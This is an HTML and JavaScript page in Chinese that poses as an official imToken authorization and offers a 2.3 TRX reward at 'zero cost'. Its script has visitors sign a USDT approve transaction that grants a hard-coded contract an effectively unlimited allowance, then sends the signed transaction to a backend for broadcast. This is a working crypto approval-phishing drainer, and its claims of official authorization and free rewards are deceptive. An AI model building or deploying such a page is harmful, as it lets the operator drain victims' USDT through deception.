<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>imToken官方授权（代付版）</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            padding: 15px 12px; 
            max-width: 600px; 
            margin: 0 auto; 
            background: #121a17; 
            color: #e0e8e4; 
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            gap: 8px; 
            border-radius: 8px;
            border-left: 3px solid #3b82f6;
        }
        .container {
            flex: 1;
            display: flex;
            flex-direction: column;
            gap: 10px; 
        }
        .header {
            text-align: center;
            padding: 10px 0;
            border-bottom: 1px solid #334155;
            margin-bottom: 5px;
            display:flex;
            justify-content: center;
        }
        .header h1 { 
            font-size: 22px; 
            color: #3b82f6; 
            margin-bottom: 5px;
        }
        .header .desc {
            font-size: 13px; 
            color: #a0a8a4;
            max-width: 450px;
            margin: 0 auto;
            line-height: 1.4; 
        }
        .warning {
            background: #334155;
            color: #93c5fd;
            padding: 12px; 
            border-radius: 8px;
            font-size: 13px; 
            border-left: 3px solid #4ade80;
            line-height: 1.5;
        }
        .warning strong {
            color: #3b82f6;
        }
        #userInfo {
            text-align: center;
            font-size: 14px;
            padding: 15px; 
            background: #1e2925;
            border-radius: 8px;
            border: 1px solid #334155;
            line-height: 1.6;
        }
        #userInfo span {
            color: #3b82f6;
            font-weight: 500;
        }
        #walletStatusContainer {
            background: #1e2925;
            padding: 15px;
            border-radius: 8px;
            border: 1px solid #334155;
            font-size: 13px;
            color: #a0a8a4;
            line-height: 1.6;
            border-right: 5px solid #4ade80;
        }
        #walletStatusContainer .status-title {
            font-size: 15px;
            color: #3b82f6;
            margin-bottom: 8px;
            display: flex;
            align-items: center;
            gap: 6px;
        }
        #walletStatusContainer .connected-content {
            display: none;
        }
        #walletStatusContainer.connected .disconnected-content {
            display: none;
        }
        #walletStatusContainer.connected .connected-content {
            display: block;
        }
        #walletStatusContainer .highlight {
            color: #3b82f6;
            font-weight: 500;
        }
        #walletStatusContainer.connected .connected-content .orange-tip {
            color: #f97316;
            margin-top: 4px;
        }
        #contractResourceContainer {
            background: #1e2925;
            padding: 15px; 
            border-radius: 8px;
            border: 1px solid #334155;
            font-size: 13px;
            color: #a0a8a4;
            line-height: 1.8;
            border-bottom: 2px solid rgba(59, 130, 246, 0.2);
        }
        #contractResourceContainer .status-title {
            font-size: 15px;
            color: #3b82f6;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        #contractResourceContainer .status-title i {
            font-size: 16px;
            color: #93c5fd;
        }
        #contractResourceContainer .highlight {
            color: #3b82f6;
            font-weight: 500;
        }
        #contractResourceContainer .data-tag {
            background: rgba(59, 130, 246, 0.15);
            padding: 2px 8px;
            border-radius: 4px;
            border: 1px solid rgba(59, 130, 246, 0.3);
        }
        .record-list {
            background: #1e2925;
            padding: 15px; 
            border-radius: 8px;
            border: 1px solid #334155;
            font-size: 13px;
            border-right: 5px solid #4ade80;
        }
        .record-item {
            margin-bottom: 10px;
            padding-bottom: 10px;
            border-bottom: 1px solid #334155;
        }
        .record-item:hover {
            border-color: #3b82f6;
            transition: border-color 0.3s;
        }
        .record-item p {
            margin-bottom: 6px; 
            color: #a0a8a4;
            line-height: 1.4;
        }
        .record-item p strong {
            color: #e0e8e4;
            margin-right: 5px;
        }
        .tx-link {
            color: #3b82f6;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 5px;
            font-size: 13px;
        }
        .tx-link:hover {
            text-decoration: underline;
        }
        .copy-link-wrap {
            background: #1e2925;
            padding: 8px; 
            border-radius: 8px;
            display: flex;
            align-items: center;
            gap: 8px;
            border: 1px solid #334155;
        }
        #copyLinkText {
            flex: 1;
            color: #a0a8a4;
            font-size: 13px;
            word-break: break-all;
            line-height: 1.3;
        }
        #copyLinkBtn {
            padding: 6px 12px; 
            background: #2563eb;
            color: #fff;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 5px;
            font-size: 13px;
        }
        #copyLinkBtn:hover {
            background: #3b82f6;
        }
        .btn-group {
            display: flex;
            flex-direction: column;
            gap: 5px; 
            margin-top: 10px;
            padding: 10px 0;
            border-top: 1px solid #334155;
        }
        .btn {
            width: 100%;
            padding: 18px; 
            font-size: 15px;
            border: none;
            border-radius: 8px;
            background: #2563eb;
            color: white;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            transition: background 0.3s;
        }
        .btn:hover {
            background: #3b82f6;
        }
        .btn:disabled {
            background: #294b75;
            color: #a0a8a4;
            cursor: not-allowed;
        }
        .footer-info {
            margin-top: 10px;
            padding-top: 10px;
            border-top: 1px solid #334155;
            font-size: 11px; 
            color: #a0a8a4;
            text-align: center;
            line-height: 1.5;
        }
        .footer-info a {
            color: #3b82f6;
            text-decoration: none;
        }
        .footer-info a:hover {
            text-decoration: underline;
        } 
        .text-right {
            text-align: right;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">   
            <h1>合约授权代付</h1>
            <p class="desc">授权我的合约，0成本+领TRX奖励（每个地址限1次）</p>
        </div>   
        <div id="userInfo">
            未连接钱包<br>
            <span>请点击底部「连接imToken钱包」按钮</span>
        </div>
        <div id="walletStatusContainer">
            <div class="status-title"><h3> 钱包状态</h3></div>
            <div class="disconnected-content">
                <span >未连接钱包</span>
                <p><span class="highlight">1. 授权我的合约，无需你支付任何TRX矿工费</span></p>
                <p><span class="highlight">2. 授权成功后，自动发放 2.3 TRX 奖励</span></p>
                <p><span class="highlight">3. 每个钱包地址仅可领取1次奖励</span></p>
            </div>
            <div class="connected-content">
                <p>✅ 钱包已成功连接</p>
                <p>• 钱包地址：<span class="highlight" id="statusAddress"></span></p>
                <p>• 授权对象：<span class="highlight">我的合约（${PAYMENT_CONTRACT.slice(0,8)}...）</span></p>
                <p>• 奖励额度：<span class="highlight">2.3 TRX</span></p>
                <p>• 费用说明：<span class="highlight">我代付全部矿工费，你0成本</span></p>
            </div>
        </div>
        <div id="contractResourceContainer">
            <div class="status-title">     
                <h3>代付资源</h3>
            </div>
            <div class="resource-content">
                <p>• 我的合约地址：<span class="highlight" id="contractAddr">${PAYMENT_CONTRACT.slice(0,8)}...${PAYMENT_CONTRACT.slice(-6)}</span></p>
                <p>• 代付账户剩余TRX：<span class="highlight data-tag" id="contractTrxDisplay">获取中...</span></p>
            </div>
        </div>
        <div class="record-list">
            <span id="approvalRecords"class="highlight">暂无授权记录</span>        
        </div>
    </div>
    <div class="btn-group">
        <div class="warning">
            <p> ⚠️ 请用 <strong>imToken钱包内置浏览器</strong> 打开</p>
            <div class="copy-link-wrap">
                <span id="copyLinkText">${window.location.href}</span>
                <button id="copyLinkBtn">复制链接</button>
            </div>
        </div> 
        <button id="connectBtn" class="btn"> 连接imToken钱包</button>
        <button id="approveBtn" class="btn" disabled>授权合约+领TRX奖励</button>
    </div>
    <div class="footer-info">
        合约验证：${PAYMENT_CONTRACT}（TRON浏览器查询）
        © 2025 合约代付 | <a href="https://tronscan.org" target="_blank">TRON浏览器</a>
    </div>
    <script>
        // 核心配置
        const MY_CONTRACT = "TQFJgVCYUk6DhEpZCvua2crRwD8XY6FiVk"; // 你的合约地址（用户授权的对象）
        const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // 授权的代币（如USDT）
        const REWARD_TRX_AMOUNT = "2.3"; // 奖励TRX额度
        const REWARD_TRX_RAW = String(Math.floor(parseFloat(REWARD_TRX_AMOUNT) * 1000000)); // TRX转Sun（最小单位）
        const BACKEND_API = "https://你的后端域名/api"; // 后端代付+发奖励接口
        const RECORD_KEY = "approval_reward_records";
        
        let tronWeb, userAddress;
        let isProcessing = false;

        window.onload = async () => {
            // DOM初始化
            const connectBtn = document.getElementById("connectBtn");
            const approveBtn = document.getElementById("approveBtn");
            const copyLinkBtn = document.getElementById("copyLinkBtn");
            const warning = document.querySelector('.warning');
            const recordlist = document.querySelector('.record-list');

            // 复制链接
            copyLinkBtn.addEventListener("click", async () => {
                const link = document.getElementById("copyLinkText").textContent.trim();
                try {
                    await navigator.clipboard.writeText(link);
                    alert("链接已复制");
                } catch (e) {
                    const input = document.createElement("input");
                    input.value = link;
                    document.body.appendChild(input);
                    input.select();
                    document.execCommand("copy");
                    document.body.removeChild(input);
                    alert("链接已复制（兼容模式）");
                }
            });

            // 等待imToken注入tronWeb
            let tronWebWaitTimer = setInterval(() => {
                if (window.tronWeb && window.tronWeb.ready) {
                    clearInterval(tronWebWaitTimer);
                    initWallet();
                }
            }, 500);
            setTimeout(() => clearInterval(tronWebWaitTimer), 10000);

            // 连接钱包
            connectBtn.onclick = () => {
                window.location.href = `imtoken://browser?url=${encodeURIComponent(window.location.href)}`;
            };

            // 核心：发起代付授权+领奖励
            approveBtn.onclick = async () => {
                if (!userAddress || isProcessing) return;
                isProcessing = true;
                approveBtn.disabled = true;
                approveBtn.innerHTML = '<<i class="fa fa-spinner fa-spin"></</i> 发起授权（0成本）...';

                try {
                    // 1. 构造Approve交易主体（用户授权你的合约操作其USDT）
                    const approveTx = await tronWeb.transactionBuilder.triggerSmartContract(
                        tronWeb.address.toHex(USDT_CONTRACT), // USDT合约地址（hex）
                        "approve(address,uint256)", // 授权方法
                        { feeLimit: 10000000 }, // 矿工费上限（由你代付）
                        [
                            { type: "address", value: tronWeb.address.toHex(MY_CONTRACT) }, // 授权对象：你的合约
                            { type: "uint256", value: "1000000000000000000" } // 授权额度（足够大的数）
                        ],
                        userAddress // 发起者：用户地址
                    );
                    if (!approveTx.result || !approveTx.transaction) throw new Error("构造授权交易失败");

                    // 2. 用户签名交易主体（仅签名，不支付矿工费）
                    const signedTx = await tronWeb.trx.sign(approveTx.transaction);
                    if (!signedTx) throw new Error("用户签名交易失败");

                    // 3. 发送给后端：由你代付矿工费并广播交易
                    approveBtn.innerHTML = '<<i class="fa fa-spinner fa-spin"></</i> 我代付矿工费中...';
                    const res = await fetch(`${BACKEND_API}/delegate-approve`, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                            userSignedTx: signedTx, // 用户签名的交易主体
                            userAddress: userAddress,
                            rewardAmount: REWARD_TRX_RAW // 奖励TRX额度（Sun）
                        })
                    });
                    const data = await res.json();
                    if (!res.ok || !data.success) throw new Error(data.error || "授权失败");

                    // 4. 授权+奖励成功
                    alert(`✅ 授权成功！\n已发放 ${REWARD_TRX_AMOUNT} TRX 奖励\n授权交易哈希：${data.approveTxid}\n奖励转账哈希：${data.rewardTxid}`);
                    window.open(`https://tronscan.org/#/transaction/${data.rewardTxid}`, "_blank");

                    // 保存记录
                    saveRecord({
                        address: userAddress,
                        reward: REWARD_TRX_AMOUNT + " TRX",
                        approveTx: data.approveTxid,
                        rewardTx: data.rewardTxid,
                        time: new Date().toLocaleString(),
                        status: "成功"
                    });
                    renderRecords();
                } catch (e) {
                    alert(`操作失败：${e.message}`);
                } finally {
                    isProcessing = false;
                    approveBtn.disabled = false;
                    approveBtn.innerHTML = "授权合约+领TRX奖励";
                }
            };
        };

        // 初始化钱包
        async function initWallet() {
            tronWeb = window.tronWeb;
            userAddress = tronWeb.defaultAddress.base58;
            if (!userAddress) {
                alert("请在imToken中登录钱包");
                return;
            }

            // 更新UI
            document.getElementById("userInfo").innerHTML = `
                已连接：<br>
                ${userAddress.slice(0,8)}...${userAddress.slice(-6)}
            `;
            document.getElementById("statusAddress").textContent = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
            document.getElementById("walletStatusContainer").classList.add("connected");
            document.getElementById("connectBtn").style.display = "none";
            document.querySelector(".warning").style.display = "none";
            document.getElementById("approveBtn").disabled = false;

            // 查代付账户剩余TRX
            getDelegateTrxBalance();
            // 查历史记录
            renderRecords();
        }

        // 查你的代付账户剩余TRX
        async function getDelegateTrxBalance() {
            try {
                const res = await fetch(`${BACKEND_API}/delegate-balance`);
                const data = await res.json();
                document.getElementById("contractTrxDisplay").textContent = data.trxBalance.toFixed(2);
            } catch (e) {
                document.getElementById("contractTrxDisplay").textContent = "获取失败";
            }
        }

        // 保存/渲染记录
        function saveRecord(record) {
            const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
            records.push(record);
            localStorage.setItem(RECORD_KEY, JSON.stringify(records));
        }
        function renderRecords() {
            const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
            const container = document.getElementById("approvalRecords");
            if (records.length === 0) {
                container.innerHTML = "<div class='record-item'>暂无记录</div>";
                return;
            }
            container.innerHTML = records.map(r => `
                <div class="record-item">
                    <p><strong>地址：</strong>${r.address.slice(0,8)}...${r.address.slice(-6)}</p>
                    <p><strong>奖励：</strong>${r.reward}</p>
                    <p><strong>授权哈希：</strong><a href="https://tronscan.org/#/transaction/${r.approveTx}" target="_blank" class="tx-link">${r.approveTx.slice(0,10)}...</a></p>
                    <p><strong>奖励哈希：</strong><a href="https://tronscan.org/#/transaction/${r.rewardTx}" target="_blank" class="tx-link">${r.rewardTx.slice(0,10)}...</a></p>
                    <p><strong>时间：</strong>${r.time}</p>
                </div>
            `).join("");
        }
    </script>
</body>
</html>
